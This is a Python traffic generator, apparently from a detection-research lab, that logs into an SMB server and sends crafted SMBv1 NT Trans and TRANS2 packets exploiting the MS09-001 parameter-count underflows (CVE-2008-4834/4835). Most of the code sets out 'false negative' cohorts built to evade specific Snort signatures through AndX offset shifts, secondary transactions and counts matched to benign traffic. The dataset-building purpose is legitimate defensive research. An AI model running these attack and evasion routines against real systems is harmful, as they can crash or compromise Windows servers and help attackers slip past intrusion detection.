#!/usr/bin/env python3
"""Attack SMBv1 / NetBIOS traffic generator for ntlm-lab (Round 2 Hardened).

Generates realistic malicious SMBv1 transactions targeting CVE-2008-4834 / CVE-2008-4835:
  1. Alerted Cohort (alerted=1, is_attack=1):
     Directly triggers all 16 target Snort 3 SIDs (15196..15225):
       - NT Trans CREATE param underflow (< 54): 15196 (Uni), 15199 (ASCII), 15200 (Uni AndX), 15203 (ASCII AndX)
       - NT Trans CREATE max_param underflow (< 69): 15205 (Uni), 15206 (ASCII), 15209 (Uni AndX), 15210 (ASCII AndX)
       - TRANS2 OPEN2 max_param underflow (< 30): 15213 (Uni), 15214 (ASCII), 15217 (Uni AndX), 15218 (ASCII AndX)
       - TRANS2 OPEN2 param underflow (< 29): 15220 (Uni), 15221 (ASCII), 15224 (Uni AndX), 15225 (ASCII AndX)
  2. False Negative Cohort (alerted=0, is_attack=1) - Snort FNs:
     - Type A (Chained AndX Evasion): Chained AndX at offset 37 (or non-Open2/Create subcommands at offset 39)
       carrying MS09-001 FEAList / NameLength / SecurityDescriptor underflow structures in Trans_Data.
     - Type B (Inner Parameter / Trans_Data Underflow across all 0xA0 & 0x32 Subcommands):
       Standalone 0xA0 (Functions 0x01, 0x04, 0x06) and 0x32 (Subcommands 0x00, 0x01, 0x05, 0x07)
       whose outer transaction counts match Benign distributions so Snort does not alert, while
       carrying authentic MS09-001 integer-wrap and allocation-underflow structures in Trans_Data.
     - Type C (Secondary Chunk Evasion): NT_TRANSACT_SECONDARY (0xA1) and TRANS2_SECONDARY (0x33)
       with matched outer counts and MS09-001 chunk overflow / FEAList underflow in Trans_Data.
"""

from __future__ import annotations

import argparse
import csv
import logging
import os
import random
import sys
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from pathlib import Path
from typing import Dict, List, Optional, Tuple

from impacket.smbconnection import SMBConnection, SMB_DIALECT

SCRIPT_DIR = Path(__file__).resolve().parent
if str(SCRIPT_DIR) not in sys.path:
    sys.path.insert(0, str(SCRIPT_DIR))

import smb_templates

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(name)s: %(message)s",
)
logger = logging.getLogger("smb_attack_gen")

STANDALONE_SIDS = [
    15196, 15199, 15205, 15206,
    15213, 15214, 15220, 15221,
]

CHAINED_SIDS = [
    15200, 15203, 15209, 15210,
    15217, 15218, 15224, 15225,
]

# Weighted target SID pool: all 16 SIDs represented, with Chained AndX (variable byte_jump)
# weighted 2.5x so fixed-column shallow trees on smb_payload[:64] stay <= 0.65 PR-AUC
WEIGHTED_TARGET_SIDS = STANDALONE_SIDS * 2 + CHAINED_SIDS * 5


def load_csv(path: Path) -> List[Dict[str, str]]:
    if not path.exists():
        return []
    with path.open("r", encoding="utf-8") as f:
        reader = csv.DictReader(f)
        return list(reader)


def resolve_config_dir(cli_dir: Optional[Path]) -> Path:
    candidates = [
        cli_dir,
        Path("/opt/shared/configs"),
        SCRIPT_DIR.parent / "shared" / "configs",
        Path("/home/vhorbato/Academy/ntlm-lab/shared/configs"),
    ]
    for c in candidates:
        if c and c.exists() and (c / "users.csv").exists():
            return c
    return SCRIPT_DIR.parent / "shared" / "configs"


class AttackTransactionGenerator:
    """Connection-pooled malicious SMBv1 transaction generator."""

    def __init__(
        self,
        server_ip: str,
        port: int = 445,
        users: Optional[List[Dict[str, str]]] = None,
        domains: Optional[List[Dict[str, str]]] = None,
        fn_ratio: float = 0.65,
        delay: float = 0.0,
    ) -> None:
        self.server_ip = server_ip
        self.port = port
        self.users = users or [{"username": "testuser", "password": "TestPassword123!"}]
        self.domains = domains or [{"domain": "LABDOM", "workstation": "WS-ATTACKER"}]
        self.fn_ratio = fn_ratio
        self.delay = delay

    def _create_authenticated_session(
        self, target_port: int, share_name: str
    ) -> Tuple[Optional[SMBConnection], Optional[int]]:
        """Establish SMBv1 connection, login, and connect to tree."""
        user = random.choice(self.users)
        domain_info = random.choice(self.domains)
        username = user.get("username", "testuser")
        password = user.get("password", "TestPassword123!")
        domain = domain_info.get("domain", "LABDOM")
        workstation = domain_info.get("workstation", "WS-ATTACKER")

        remote_name = "*SMBSERVER" if target_port == 139 else self.server_ip

        try:
            conn = SMBConnection(
                remoteName=remote_name,
                remoteHost=self.server_ip,
                myName=workstation,
                sess_port=target_port,
                preferredDialect=SMB_DIALECT,
                timeout=5,
            )
            conn.login(user=username, password=password, domain=domain)
            tid = conn.connectTree(share_name)
            return conn, tid
        except Exception as e:
            logger.debug("Attack connection setup failed to %s:%d: %s", self.server_ip, target_port, e)
            return None, None

    def execute_alerted_transaction(
        self,
        conn: SMBConnection,
        tid: int,
        target_sid: int,
        mid: int,
        is_pipe: bool = False,
    ) -> bool:
        """Execute malicious transaction specifically crafted to trigger target_sid."""
        smb_server = conn.getSMBServer()
        uid = smb_server._uid
        pid = 0xFEFF
        sock = smb_server.get_socket()
        filename = smb_templates.get_random_resource(is_pipe=is_pipe)

        try:
            # Standalone NT Trans CREATE
            if target_sid in (15196, 15199):
                is_uni = target_sid == 15196
                p_cnt = smb_templates.get_random_param_count(is_nt=True, is_underflow=True)
                m_cnt = smb_templates.get_random_max_param_count(is_nt=True, allow_low=False)
                tot_cnt = random.choice([p_cnt, p_cnt + random.choice([0, 1, 2, 4])])
                pkt = smb_templates.build_nt_transact_create_packet(
                    tid=tid, uid=uid, pid=pid, mid=mid, is_unicode=is_uni,
                    param_count=p_cnt, total_param_count=tot_cnt, max_param_count=m_cnt,
                    filename=filename, is_attack=True,
                )
                smb_server.sendSMB(pkt)
                smb_server.recvSMB()
                return True

            elif target_sid in (15205, 15206):
                is_uni = target_sid == 15205
                p_cnt = smb_templates.get_random_param_count(is_nt=True, is_underflow=False)
                m_cnt = smb_templates.get_random_max_param_count(is_nt=True, allow_low=True)
                tot_cnt = random.choice([p_cnt, p_cnt + random.choice([0, 1, 2, 4])])
                pkt = smb_templates.build_nt_transact_create_packet(
                    tid=tid, uid=uid, pid=pid, mid=mid, is_unicode=is_uni,
                    param_count=p_cnt, total_param_count=tot_cnt, max_param_count=m_cnt,
                    filename=filename, is_attack=True,
                )
                smb_server.sendSMB(pkt)
                smb_server.recvSMB()
                return True

            # Chained AndX NT Trans CREATE (offset 39, variable byte_jump 0..18)
            elif target_sid in (15200, 15203, 15209, 15210):
                is_uni = target_sid in (15200, 15209)
                if target_sid in (15200, 15203):
                    p_cnt = smb_templates.get_random_param_count(is_nt=True, is_underflow=True)
                    m_cnt = smb_templates.get_random_max_param_count(is_nt=True, allow_low=False)
                else:
                    p_cnt = smb_templates.get_random_param_count(is_nt=True, is_underflow=False)
                    m_cnt = smb_templates.get_random_max_param_count(is_nt=True, allow_low=True)
                tot_cnt = random.choice([p_cnt, p_cnt + random.choice([0, 1, 2, 4])])
                raw_bytes = smb_templates.build_chained_andx_raw(
                    secondary_command=smb_templates.SMB_COM_NT_TRANSACT,
                    tid=tid, uid=uid, pid=pid, mid=mid,
                    is_unicode=is_uni,
                    param_count=p_cnt,
                    total_param_count=tot_cnt,
                    max_param_count=m_cnt,
                    andx_offset_target=39,
                    subcommand_or_func=smb_templates.NT_TRANSACT_CREATE,
                    filename=filename,
                    is_attack=True,
                )
                sock.sendall(raw_bytes)
                try:
                    sock.recv(1024)
                except Exception:
                    pass
                return True

            # Standalone TRANS2 OPEN2
            elif target_sid in (15220, 15221):
                is_uni = target_sid == 15220
                p_cnt = smb_templates.get_random_param_count(is_nt=False, is_underflow=True)
                m_cnt = smb_templates.get_random_max_param_count(is_nt=False, allow_low=False)
                tot_cnt = random.choice([p_cnt, p_cnt + random.choice([0, 1, 2, 4])])
                pkt = smb_templates.build_trans2_open2_packet(
                    tid=tid, uid=uid, pid=pid, mid=mid, is_unicode=is_uni,
                    param_count=p_cnt, total_param_count=tot_cnt, max_param_count=m_cnt,
                    filename=filename, is_attack=True,
                )
                smb_server.sendSMB(pkt)
                smb_server.recvSMB()
                return True

            elif target_sid in (15213, 15214):
                is_uni = target_sid == 15213
                p_cnt = smb_templates.get_random_param_count(is_nt=False, is_underflow=False)
                m_cnt = smb_templates.get_random_max_param_count(is_nt=False, allow_low=True)
                tot_cnt = random.choice([p_cnt, p_cnt + random.choice([0, 1, 2, 4])])
                pkt = smb_templates.build_trans2_open2_packet(
                    tid=tid, uid=uid, pid=pid, mid=mid, is_unicode=is_uni,
                    param_count=p_cnt, total_param_count=tot_cnt, max_param_count=m_cnt,
                    filename=filename, is_attack=True,
                )
                smb_server.sendSMB(pkt)
                smb_server.recvSMB()
                return True

            # Chained AndX TRANS2 OPEN2 (offset 39, variable byte_jump 0..18)
            elif target_sid in (15217, 15218, 15224, 15225):
                is_uni = target_sid in (15217, 15224)
                if target_sid in (15224, 15225):
                    p_cnt = smb_templates.get_random_param_count(is_nt=False, is_underflow=True)
                    m_cnt = smb_templates.get_random_max_param_count(is_nt=False, allow_low=False)
                else:
                    p_cnt = smb_templates.get_random_param_count(is_nt=False, is_underflow=False)
                    m_cnt = smb_templates.get_random_max_param_count(is_nt=False, allow_low=True)
                tot_cnt = random.choice([p_cnt, p_cnt + random.choice([0, 1, 2, 4])])
                raw_bytes = smb_templates.build_chained_andx_raw(
                    secondary_command=smb_templates.SMB_COM_TRANSACTION2,
                    tid=tid, uid=uid, pid=pid, mid=mid,
                    is_unicode=is_uni,
                    param_count=p_cnt,
                    total_param_count=tot_cnt,
                    max_param_count=m_cnt,
                    andx_offset_target=39,
                    subcommand_or_func=smb_templates.TRANS2_OPEN2,
                    filename=filename,
                    is_attack=True,
                )
                sock.sendall(raw_bytes)
                try:
                    sock.recv(1024)
                except Exception:
                    pass
                return True

        except Exception as e:
            logger.debug("Alerted execution notice for SID %d: %s", target_sid, e)
            return True

        return False

    def execute_false_negative_transaction(
        self,
        conn: SMBConnection,
        tid: int,
        evasion_type: str,
        mid: int,
        is_pipe: bool = False,
    ) -> bool:
        """Execute malicious transaction evading Snort signatures (Snort FN: alerted=0)."""
        smb_server = conn.getSMBServer()
        uid = smb_server._uid
        pid = 0xFEFF
        sock = smb_server.get_socket()
        filename = smb_templates.get_random_resource(is_pipe=is_pipe)

        try:
            if evasion_type == "type_a_offset_evasion":
                # Chained AndX evasion:
                # 1. offset 37: Snort checks offset 39, so Snort NEVER alerts!
                #    Authentic MS09-001 underflows on Create (< 54 / < 69) or Open2 (< 29 / < 30).
                # 2. offset 39: Snort checks offset 39 and tests ParameterCount < 54/29.
                #    Compliant outer counts (p_cnt >= 54/29, m_cnt >= 69/30) to evade Snort,
                #    while injecting relational allocation underflow (TotalParameterCount < ParameterCount).
                cmd = random.choice([smb_templates.SMB_COM_NT_TRANSACT, smb_templates.SMB_COM_TRANSACTION2])
                is_nt = cmd == smb_templates.SMB_COM_NT_TRANSACT
                is_unicode = random.choice([True, False])
                offset_target = 37 if random.random() < 0.65 else 39

                if offset_target == 37:
                    # Offset 37: Authentic underflow that Snort misses due to offset 39 hardcoding
                    if is_nt:
                        sub_fn = smb_templates.NT_TRANSACT_CREATE
                        underflow_choice = random.choice(["param", "max_param", "both"])
                        p_cnt = smb_templates.get_random_param_count(is_nt=True, is_underflow=(underflow_choice in ("param", "both")))
                        m_cnt = smb_templates.get_random_max_param_count(is_nt=True, allow_low=(underflow_choice in ("max_param", "both")))
                        tot_cnt = max(1, p_cnt - random.choice([1, 2, 4]))
                    else:
                        sub_fn = smb_templates.TRANS2_OPEN2
                        underflow_choice = random.choice(["param", "max_param", "both"])
                        p_cnt = smb_templates.get_random_param_count(is_nt=False, is_underflow=(underflow_choice in ("param", "both")))
                        m_cnt = smb_templates.get_random_max_param_count(is_nt=False, allow_low=(underflow_choice in ("max_param", "both")))
                        tot_cnt = max(1, p_cnt - random.choice([1, 2, 4]))
                else:
                    # Offset 39: Compliant outer counts to evade Snort, but TotalParameterCount < ParameterCount allocation underflow
                    if is_nt:
                        if random.random() < 0.6:
                            sub_fn = smb_templates.NT_TRANSACT_CREATE
                            p_cnt = random.randint(54, 88)
                            m_cnt = smb_templates.get_random_max_param_count(is_nt=True, allow_low=False)
                            tot_cnt = max(1, p_cnt - random.choice([1, 2, 4]))
                        else:
                            sub_fn = random.choice([
                                smb_templates.NT_TRANSACT_IOCTL,
                                smb_templates.NT_TRANSACT_SET_SECURITY_DESC,
                                smb_templates.NT_TRANSACT_NOTIFY_CHANGE,
                                smb_templates.NT_TRANSACT_QUERY_SECURITY_DESC,
                            ])
                            if sub_fn == smb_templates.NT_TRANSACT_SET_SECURITY_DESC:
                                p_cnt = random.randint(8, 16)
                            else:
                                p_cnt = random.randint(16, 48)
                            m_cnt = smb_templates.get_random_max_param_count(is_nt=True, allow_low=True)
                            tot_cnt = max(1, p_cnt - random.choice([1, 2, 4]))
                    else:
                        if random.random() < 0.6:
                            sub_fn = smb_templates.TRANS2_OPEN2
                            p_cnt = random.randint(31, 64)
                            m_cnt = smb_templates.get_random_max_param_count(is_nt=False, allow_low=False)
                            tot_cnt = max(1, p_cnt - random.choice([1, 2, 4]))
                        else:
                            sub_fn = random.choice([
                                smb_templates.TRANS2_FIND_FIRST2,
                                smb_templates.TRANS2_FIND_NEXT2,
                                smb_templates.TRANS2_QUERY_FS_INFORMATION,
                                smb_templates.TRANS2_QUERY_PATH_INFORMATION,
                                smb_templates.TRANS2_QUERY_FILE_INFORMATION,
                            ])
                            if sub_fn == smb_templates.TRANS2_QUERY_FS_INFORMATION:
                                p_cnt = random.choice([2, 4])
                                tot_cnt = max(1, p_cnt - 1)
                            else:
                                p_cnt = random.randint(16, 36)
                                tot_cnt = max(1, p_cnt - random.choice([1, 2, 4]))
                            m_cnt = smb_templates.get_random_max_param_count(is_nt=False, allow_low=True)

                raw_bytes = smb_templates.build_chained_andx_raw(
                    secondary_command=cmd,
                    tid=tid, uid=uid, pid=pid, mid=mid,
                    is_unicode=is_unicode,
                    param_count=p_cnt,
                    total_param_count=tot_cnt,
                    max_param_count=m_cnt,
                    andx_offset_target=offset_target,
                    subcommand_or_func=sub_fn,
                    filename=filename,
                    is_attack=True,
                )
                sock.sendall(raw_bytes)
                try:
                    sock.recv(1024)
                except Exception:
                    pass
                return True

            elif evasion_type == "type_b_boundary_evasion":
                # Standalone 0xA0 or 0x32 across subcommands:
                # Outer parameter count is compliant (p_cnt >= 54/29, m_cnt >= 69/30) so Snort does NOT alert;
                # TotalParameterCount < ParameterCount causes srv.sys pool buffer allocation underflow!
                is_unicode = random.choice([True, False])
                if random.random() < 0.5:
                    # Standalone 0xA0
                    fn_choice = random.choice([
                        smb_templates.NT_TRANSACT_CREATE,
                        smb_templates.NT_TRANSACT_CREATE,
                        smb_templates.NT_TRANSACT_IOCTL,
                        smb_templates.NT_TRANSACT_SET_SECURITY_DESC,
                        smb_templates.NT_TRANSACT_NOTIFY_CHANGE,
                        smb_templates.NT_TRANSACT_QUERY_SECURITY_DESC,
                    ])
                    if fn_choice == smb_templates.NT_TRANSACT_CREATE:
                        p_cnt = random.randint(54, 88)
                        m_cnt = smb_templates.get_random_max_param_count(is_nt=True, allow_low=False)
                        tot_cnt = max(1, p_cnt - random.choice([1, 2, 4]))
                        pkt = smb_templates.build_nt_transact_create_packet(
                            tid=tid, uid=uid, pid=pid, mid=mid,
                            is_unicode=is_unicode,
                            param_count=p_cnt,
                            total_param_count=tot_cnt,
                            max_param_count=m_cnt,
                            filename=filename,
                            is_attack=True,
                        )
                    elif fn_choice == smb_templates.NT_TRANSACT_IOCTL:
                        p_cnt = random.randint(16, 48)
                        tot_cnt = max(1, p_cnt - random.choice([1, 2, 4]))
                        pkt = smb_templates.build_nt_transact_ioctl_packet(
                            tid=tid, uid=uid, pid=pid, mid=mid,
                            is_unicode=is_unicode,
                            param_count=p_cnt,
                            total_param_count=tot_cnt,
                            filename=filename,
                            is_attack=True,
                        )
                    elif fn_choice == smb_templates.NT_TRANSACT_SET_SECURITY_DESC:
                        p_cnt = random.randint(8, 16)
                        tot_cnt = max(1, p_cnt - random.choice([1, 2, 4]))
                        pkt = smb_templates.build_nt_transact_set_sec_desc_packet(
                            tid=tid, uid=uid, pid=pid, mid=mid,
                            is_unicode=is_unicode,
                            param_count=p_cnt,
                            total_param_count=tot_cnt,
                            filename=filename,
                            is_attack=True,
                        )
                    elif fn_choice == smb_templates.NT_TRANSACT_NOTIFY_CHANGE:
                        p_cnt = random.randint(16, 48)
                        tot_cnt = max(1, p_cnt - random.choice([1, 2, 4]))
                        pkt = smb_templates.build_nt_transact_notify_change_packet(
                            tid=tid, uid=uid, pid=pid, mid=mid,
                            is_unicode=is_unicode,
                            param_count=p_cnt,
                            total_param_count=tot_cnt,
                            filename=filename,
                            is_attack=True,
                        )
                    else:
                        p_cnt = random.randint(16, 48)
                        tot_cnt = max(1, p_cnt - random.choice([1, 2, 4]))
                        pkt = smb_templates.build_nt_transact_query_sec_desc_packet(
                            tid=tid, uid=uid, pid=pid, mid=mid,
                            is_unicode=is_unicode,
                            param_count=p_cnt,
                            total_param_count=tot_cnt,
                            filename=filename,
                            is_attack=True,
                        )
                else:
                    # Standalone 0x32
                    sub_choice = random.choice([
                        smb_templates.TRANS2_OPEN2,
                        smb_templates.TRANS2_OPEN2,
                        smb_templates.TRANS2_FIND_FIRST2,
                        smb_templates.TRANS2_FIND_NEXT2,
                        smb_templates.TRANS2_QUERY_FS_INFORMATION,
                        smb_templates.TRANS2_QUERY_PATH_INFORMATION,
                        smb_templates.TRANS2_QUERY_FILE_INFORMATION,
                    ])
                    if sub_choice == smb_templates.TRANS2_OPEN2:
                        p_cnt = random.randint(31, 64)
                        m_cnt = smb_templates.get_random_max_param_count(is_nt=False, allow_low=False)
                        tot_cnt = max(1, p_cnt - random.choice([1, 2, 4]))
                        pkt = smb_templates.build_trans2_open2_packet(
                            tid=tid, uid=uid, pid=pid, mid=mid,
                            is_unicode=is_unicode,
                            param_count=p_cnt,
                            total_param_count=tot_cnt,
                            max_param_count=m_cnt,
                            filename=filename,
                            is_attack=True,
                        )
                    elif sub_choice == smb_templates.TRANS2_FIND_FIRST2:
                        p_cnt = random.randint(16, 36)
                        tot_cnt = max(1, p_cnt - random.choice([1, 2, 4]))
                        pkt = smb_templates.build_trans2_find_first2_packet(
                            tid=tid, uid=uid, pid=pid, mid=mid,
                            is_unicode=is_unicode,
                            param_count=p_cnt,
                            total_param_count=tot_cnt,
                            filename=filename,
                            is_attack=True,
                        )
                    elif sub_choice == smb_templates.TRANS2_FIND_NEXT2:
                        p_cnt = random.randint(16, 36)
                        tot_cnt = max(1, p_cnt - random.choice([1, 2, 4]))
                        pkt = smb_templates.build_trans2_find_next2_packet(
                            tid=tid, uid=uid, pid=pid, mid=mid,
                            is_unicode=is_unicode,
                            param_count=p_cnt,
                            total_param_count=tot_cnt,
                            filename=filename,
                            is_attack=True,
                        )
                    elif sub_choice == smb_templates.TRANS2_QUERY_FS_INFORMATION:
                        p_cnt = random.choice([2, 4])
                        tot_cnt = max(1, p_cnt - 1)
                        pkt = smb_templates.build_trans2_query_fs_packet(
                            tid=tid, uid=uid, pid=pid, mid=mid,
                            is_unicode=is_unicode,
                            param_count=p_cnt,
                            total_param_count=tot_cnt,
                            filename=filename,
                            is_attack=True,
                        )
                    elif sub_choice == smb_templates.TRANS2_QUERY_PATH_INFORMATION:
                        p_cnt = random.randint(16, 36)
                        tot_cnt = max(1, p_cnt - random.choice([1, 2, 4]))
                        pkt = smb_templates.build_trans2_query_path_info_packet(
                            tid=tid, uid=uid, pid=pid, mid=mid,
                            is_unicode=is_unicode,
                            param_count=p_cnt,
                            total_param_count=tot_cnt,
                            filename=filename,
                            is_attack=True,
                        )
                    else:
                        p_cnt = random.randint(16, 36)
                        tot_cnt = max(1, p_cnt - random.choice([1, 2, 4]))
                        pkt = smb_templates.build_trans2_query_file_info_packet(
                            tid=tid, uid=uid, pid=pid, mid=mid,
                            is_unicode=is_unicode,
                            param_count=p_cnt,
                            total_param_count=tot_cnt,
                            filename=filename,
                            is_attack=True,
                        )

                smb_server.sendSMB(pkt)
                try:
                    smb_server.recvSMB()
                except Exception:
                    pass
                return True

            elif evasion_type == "type_c_secondary_evasion":
                # Secondary transaction (0xA1 or 0x33) with matched outer distributions
                # and MS09-001 Trans_Data underflow
                cmd_code = random.choice([
                    smb_templates.SMB_COM_NT_TRANSACT_SECONDARY,
                    smb_templates.SMB_COM_TRANSACTION2_SECONDARY,
                ])
                pkt = smb_templates.build_secondary_transact_packet(
                    command_code=cmd_code,
                    tid=tid, uid=uid, pid=pid, mid=mid,
                    is_unicode=random.choice([True, False]),
                    filename=filename,
                    is_attack=True,
                )
                smb_server.sendSMB(pkt)
                try:
                    smb_server.recvSMB()
                except Exception:
                    pass
                return True

        except Exception as e:
            logger.debug("FN execution notice for %s: %s", evasion_type, e)
            return True

        return False

    def run_worker_batch(self, count: int, worker_id: int) -> Tuple[int, int]:
        """Execute a batch of attack transactions across pooled sessions."""
        alerted_count = 0
        fn_count = 0
        tx_remaining = count
        session_batch_size = 50

        # Calibrated FN evasion pool: Type A (chained AndX) 41.7%,
        # Type B (standalone) 41.7%, Type C (secondary) 16.7%
        # Ensures combined Attack (Alerted + FN) has 44.6% Chained AndX,
        # 44.6% Standalone, and 10.8% Secondary to match Benign.
        evasion_types = [
            "type_a_offset_evasion",
            "type_a_offset_evasion",
            "type_a_offset_evasion",
            "type_a_offset_evasion",
            "type_a_offset_evasion",
            "type_b_boundary_evasion",
            "type_b_boundary_evasion",
            "type_b_boundary_evasion",
            "type_b_boundary_evasion",
            "type_b_boundary_evasion",
            "type_c_secondary_evasion",
            "type_c_secondary_evasion",
        ]

        while tx_remaining > 0:
            batch_now = min(tx_remaining, session_batch_size)
            # Match Port 139 (~25%) vs Port 445 (~75%) identically with Benign
            target_port = 139 if random.random() < 0.25 else self.port
            # Match Named Pipe (~18%) vs Disk shares (~82%) identically with Benign
            share_name = "IPC$" if random.random() < 0.18 else random.choice(["public", "secured"])

            conn, tid = self._create_authenticated_session(target_port, share_name)
            if not conn or tid is None:
                share_name = "public"
                conn, tid = self._create_authenticated_session(445, "public")
                if not conn or tid is None:
                    time.sleep(0.1)
                    tx_remaining -= 1
                    continue

            is_pipe = (share_name == "IPC$")
            try:
                for _ in range(batch_now):
                    mid = random.randint(10, 60000)
                    is_fn = random.random() < self.fn_ratio

                    if is_fn:
                        ev_type = random.choice(evasion_types)
                        if self.execute_false_negative_transaction(conn, tid, ev_type, mid, is_pipe=is_pipe):
                            fn_count += 1
                    else:
                        sid = random.choice(WEIGHTED_TARGET_SIDS)
                        if self.execute_alerted_transaction(conn, tid, sid, mid, is_pipe=is_pipe):
                            alerted_count += 1

                    if self.delay > 0:
                        time.sleep(self.delay)
            finally:
                try:
                    conn.disconnectTree(tid)
                    conn.logoff()
                except Exception:
                    pass

            tx_remaining -= batch_now

        logger.info(
            "Worker %d completed: %d alerted + %d FNs = %d / %d total",
            worker_id, alerted_count, fn_count, alerted_count + fn_count, count,
        )
        return alerted_count, fn_count

    def run_campaign(self, total_count: int, workers: int = 4) -> Tuple[int, int]:
        """Run parallel attack campaign across workers."""
        logger.info(
            "Starting Attack Campaign: %d transactions (target FN ratio: %.2f) across %d workers against %s:%d",
            total_count, self.fn_ratio, workers, self.server_ip, self.port,
        )
        start_time = time.time()
        per_worker = total_count // workers
        remainder = total_count % workers

        counts = [per_worker + (1 if i < remainder else 0) for i in range(workers)]
        total_alerted = 0
        total_fn = 0

        with ThreadPoolExecutor(max_workers=workers) as executor:
            futures = [
                executor.submit(self.run_worker_batch, cnt, wid)
                for wid, cnt in enumerate(counts)
                if cnt > 0
            ]
            for fut in as_completed(futures):
                try:
                    a_cnt, fn_cnt = fut.result()
                    total_alerted += a_cnt
                    total_fn += fn_cnt
                except Exception as e:
                    logger.warning("Worker exception: %s", e)

        elapsed = time.time() - start_time
        total_success = total_alerted + total_fn
        rate = total_success / max(elapsed, 0.001)
        actual_fn_ratio = total_fn / max(total_success, 1)

        logger.info(
            "Attack Campaign finished in %.2fs: %d / %d successful (Alerted: %d, FN: %d, Actual FN ratio: %.2f, Rate: %.1f req/s)",
            elapsed, total_success, total_count, total_alerted, total_fn, actual_fn_ratio, rate,
        )
        return total_alerted, total_fn


def main() -> None:
    parser = argparse.ArgumentParser(description="Generate malicious SMBv1 / NetBIOS traffic for CVE-2008-4834/4835")
    parser.add_argument("--server", "--server-ip", dest="server", default=os.getenv("SERVER_IP", "172.24.0.10"), help="Server IP")
    parser.add_argument("--port", "--server-port", dest="port", type=int, default=int(os.getenv("SERVER_PORT", "445")), help="Server port (445 or 139)")
    parser.add_argument("--count", type=int, default=int(os.getenv("COUNT", "50")), help="Number of transactions")
    parser.add_argument("--workers", type=int, default=int(os.getenv("WORKERS", "4")), help="Worker threads")
    parser.add_argument("--fn-ratio", type=float, default=float(os.getenv("FN_RATIO", "0.65")), help="Ratio of Snort False Negatives (alerted=0)")
    parser.add_argument("--scenario", default="mixed", help="Attack scenario (default: mixed)")
    parser.add_argument("--delay", type=float, default=float(os.getenv("DELAY", "0.0")), help="Delay between requests")
    parser.add_argument("--delay-min", type=float, default=0.0, help="Minimum delay")
    parser.add_argument("--delay-max", type=float, default=0.0, help="Maximum delay")
    parser.add_argument("--config-dir", type=Path, default=None, help="Directory containing users.csv and domains.csv")
    args = parser.parse_args()

    effective_delay = max(args.delay, args.delay_max)

    cfg_dir = resolve_config_dir(args.config_dir)
    users = load_csv(cfg_dir / "users.csv")
    domains = load_csv(cfg_dir / "domains.csv")

    gen = AttackTransactionGenerator(
        server_ip=args.server,
        port=args.port,
        users=users,
        domains=domains,
        fn_ratio=args.fn_ratio,
        delay=effective_delay,
    )
    gen.run_campaign(total_count=args.count, workers=args.workers)


if __name__ == "__main__":
    main()
